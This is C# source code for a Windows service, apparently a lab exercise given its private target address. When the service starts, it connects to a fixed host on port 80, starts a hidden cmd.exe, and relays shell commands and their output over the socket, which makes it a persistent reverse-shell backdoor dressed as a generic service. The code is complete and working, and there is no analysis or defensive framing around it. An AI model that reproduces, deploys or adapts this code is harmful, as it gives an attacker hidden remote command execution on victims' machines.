using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace Service_TH3
{
    public partial class Service1 : ServiceBase
    {

        static StreamWriter streamWriter;
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("Service start  " + DateTime.Now);
            if (IsConnectedToInternet())
            {
                WriteToFile("Internet access " + DateTime.Now);
            }
            else
            {
                WriteToFile("No Internet access " + DateTime.Now);
            }

            try
            {
                using (TcpClient client = new TcpClient("10.0.5.4", 80))    //Establish http connection with port 80.
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();      //Create new Process.
                            p.StartInfo.FileName = "cmd";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();
                            
                            while (true)
                            {
                                
                                strInput.Append(rdr.ReadLine());
                                //strInput.Append("\n");
                                p.StandardInput.WriteLine(strInput);    
                                strInput.Remove(0, strInput.Length);
                            }

                            
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                WriteToFile("Couldn't connect " + DateTime.Now);

            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception ex)
                {
                    // silence is golden
                }
            }
        }
        protected override void OnStop()
        {
        }

        public bool IsConnectedToInternet() // Check Internet connection 
        {
            string host = "8.8.8.8";    //Ping to DNS Google.
            bool res = false;
            Ping p = new Ping();
            try
            {
                PingReply reply = p.Send(host);
                if (reply.Status == IPStatus.Success)
                    return true;
            }
            catch { }
            return res;
        }
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
    }
}
